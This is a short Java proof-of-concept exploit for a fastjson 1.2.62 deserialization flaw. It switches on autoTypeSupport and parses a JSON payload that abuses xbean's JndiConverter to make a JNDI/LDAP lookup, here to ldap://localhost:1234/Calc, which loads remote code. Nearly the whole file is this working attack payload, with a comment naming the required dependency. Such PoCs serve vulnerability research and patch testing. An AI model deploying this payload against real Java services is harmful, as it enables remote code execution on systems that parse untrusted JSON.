package Poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
/*
    需要开启autoTypeSupport
    <dependency>
        <groupId>org.apache.xbean</groupId>
        <artifactId>xbean-reflect</artifactId>
        <version>4.15</version>
    </dependency>
*/
public class Poc_1_2_62_b {
    public static void main(String[] args) throws Exception{
        // turn on autoTypeSupport
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:1234/Calc\"}";
        JSON.parse(payload);
    }
}
